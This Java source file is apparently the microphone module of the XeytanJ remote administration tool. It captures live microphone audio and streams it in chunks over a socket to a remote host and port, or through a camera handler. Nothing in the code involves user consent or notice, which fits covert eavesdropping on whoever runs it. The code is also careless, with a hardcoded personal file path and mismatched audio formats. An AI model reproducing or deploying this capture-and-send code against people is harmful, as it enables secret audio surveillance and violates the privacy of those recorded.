package com.melardev.xeytanj.microphone;

import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;

import javax.sound.sampled.AudioFileFormat;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.DataLine.Info;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.SourceDataLine;
import javax.sound.sampled.TargetDataLine;
import javax.sound.sampled.UnsupportedAudioFileException;

import com.melardev.xeytanj.services.CameraHandler;
import com.melardev.xeytanj.net.packets.voice.PacketVoice;

public class MicrophoneNIO {

	private ObjectInputStream sockIn;
	private ObjectOutputStream sockOut;
	private Socket socket;
	private CameraHandler cameraHandler;
	private final int DEFAULT_SAMPLE_LENGTH = 4096;
	public volatile boolean running;
	private TargetDataLine inputLine;

	public MicrophoneNIO(String host, int port) {
		try {
			socket = new Socket(host, port);
			sockOut = new ObjectOutputStream(socket.getOutputStream());
			sockIn = new ObjectInputStream(socket.getInputStream());

			File audioFile = new File("D:/Users/rabheus/Desktop\\CPSC\\videos\\recordingRecordAudio.wav");
			try {
				AudioInputStream audioStream = AudioSystem.getAudioInputStream(audioFile);
				AudioFormat format = audioStream.getFormat();
				byte[] bytesBuffer = new byte[4096];
				int bytesRead = -1;
				float sampleRate = 16000;
				int sampleSizeInBits = 8;
				int channels = 2;
				boolean signed = true;
				boolean bigEndian = true;
				Info infoMic = new DataLine.Info(TargetDataLine.class, format);
				TargetDataLine line = (TargetDataLine) AudioSystem.getLine(infoMic);
				line.open(format);
				line.start();
				AudioInputStream ais = new AudioInputStream(line);

				if (!AudioSystem.isLineSupported(infoMic)) {
					System.out.println("Line not supported");
					System.exit(0);
				}

				//while ((bytesRead = audioStream.read(bytesBuffer)) != -1) {
				while ((bytesRead = ais.read(bytesBuffer)) != -1) {
					PacketVoice packet = new PacketVoice(bytesBuffer, bytesRead);
					sockOut.writeObject(packet);
				}			
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (LineUnavailableException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (UnsupportedAudioFileException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public MicrophoneNIO(CameraHandler camera) {
		cameraHandler = camera;
		running = true;
	}

	public void record() {
		record(DEFAULT_SAMPLE_LENGTH);
	}

	public void record(int numBytes) {
		byte[] byteBuffer = new byte[numBytes];
		float sampleRate = 16000;
		int sampleSizeInBits = 8;
		int channels = 2;
		boolean signed = true;
		boolean bigEndian = true;
		AudioFormat format = new AudioFormat(sampleRate, sampleSizeInBits, channels, signed, bigEndian);
		Info info = new DataLine.Info(TargetDataLine.class, format);
		try {
			inputLine = (TargetDataLine) AudioSystem.getLine(info);
			inputLine.open(format);
			inputLine.start();
			AudioInputStream ais = new AudioInputStream(inputLine);
			int bytesRead;
			while (running) {
				bytesRead = ais.read(byteBuffer);
				notifyRecordedChunck(byteBuffer, bytesRead);
			}
			release();
		} catch (LineUnavailableException e) {

			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void notifyRecordedChunck(byte[] byteBuffer, int bytesRead) {
		cameraHandler.sendVoice(byteBuffer, bytesRead);
	}

	private void release() {
		inputLine.stop();
		inputLine.close();
	}

	public static void main(String[] args) {

		File audioFile = new File("D:/Users/rabheus/Desktop\\CPSC\\videos\\recordingRecordAudio.wav");
		try {
			AudioInputStream audioStream = AudioSystem.getAudioInputStream(audioFile);
			AudioFormat format = audioStream.getFormat();
			DataLine.Info info = new DataLine.Info(SourceDataLine.class, format);

			SourceDataLine audioLine = (SourceDataLine) AudioSystem.getLine(info);
			audioLine.open();
			audioLine.start();
			byte[] bytesBuffer = new byte[4096];
			int bytesRead = -1;

			AudioFileFormat.Type extension = AudioFileFormat.Type.WAVE;
			float sampleRate = 16000;
			int sampleSizeInBits = 8;
			int channels = 2;
			boolean signed = true;
			boolean bigEndian = true;
			AudioFormat formatMic = new AudioFormat(sampleRate, sampleSizeInBits, channels, signed, bigEndian);
			Info infoMic = new DataLine.Info(TargetDataLine.class, formatMic);
			TargetDataLine line = (TargetDataLine) AudioSystem.getLine(infoMic);
			line.open(format);
			line.start();
			AudioInputStream ais = new AudioInputStream(line);

			if (!AudioSystem.isLineSupported(info)) {
				System.out.println("Line not supported");
				System.exit(0);
			}

			//while ((bytesRead = audioStream.read(bytesBuffer)) != -1) {
			while ((bytesRead = ais.read(bytesBuffer)) != -1) {
				audioLine.write(bytesBuffer, 0, bytesRead);
			}

			audioLine.drain();
			audioLine.close();
			audioStream.close();

		} catch (UnsupportedAudioFileException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (LineUnavailableException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	}

}
